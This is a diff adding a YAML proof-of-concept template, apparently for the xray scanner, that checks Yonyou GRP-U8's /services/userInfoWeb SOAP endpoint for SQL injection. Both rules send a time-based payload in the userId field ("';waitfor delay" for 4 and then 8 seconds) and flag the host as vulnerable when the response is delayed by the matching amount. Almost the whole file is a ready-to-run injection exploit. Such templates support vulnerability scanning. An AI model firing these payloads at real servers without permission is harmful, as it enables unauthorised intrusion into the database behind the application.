@@ -1,0 +1,46 @@
+name: poc-yaml-yongyouGRP-U8-userInfoWeb-sql
+transport: http
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /services/userInfoWeb
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+        SOAPAction: 1
+        Content-Type: text/xml;charset=UTF-8
+      body: |
+        <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://service.pt.midas.ufgov.com">
+          <soapenv:Header/>
+          <soapenv:Body>
+              <ser:getUserNameById soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+                <userId xsi:type="soapenc:string" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">';waitfor delay '0:0:4'--</userId>
+              </ser:getUserNameById>
+          </soapenv:Body>
+        </soapenv:Envelope>
+    expression: response.latency >= 4000 && response.latency <= 5000
+  r1:
+    request:
+      method: POST
+      path: /services/userInfoWeb
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+        SOAPAction: 1
+        Content-Type: text/xml;charset=UTF-8
+      body: |
+        <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://service.pt.midas.ufgov.com">
+          <soapenv:Header/>
+          <soapenv:Body>
+              <ser:getUserNameById soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+                <userId xsi:type="soapenc:string" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">';waitfor delay '0:0:8'--</userId>
+              </ser:getUserNameById>
+          </soapenv:Body>
+        </soapenv:Envelope>
+    expression: response.latency >= 8000 && response.latency <= 9000
+expression: r0() && r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247488065&idx=1&sn=e500c9b0dd9ea1c3094605b1100a9766&chksm=c267a772f5102e649cb27db01bf856334fcf7c9802ce13759de277e52be6423bc6f9464dffc4&token=1431500657&lang=zh_CN#rd
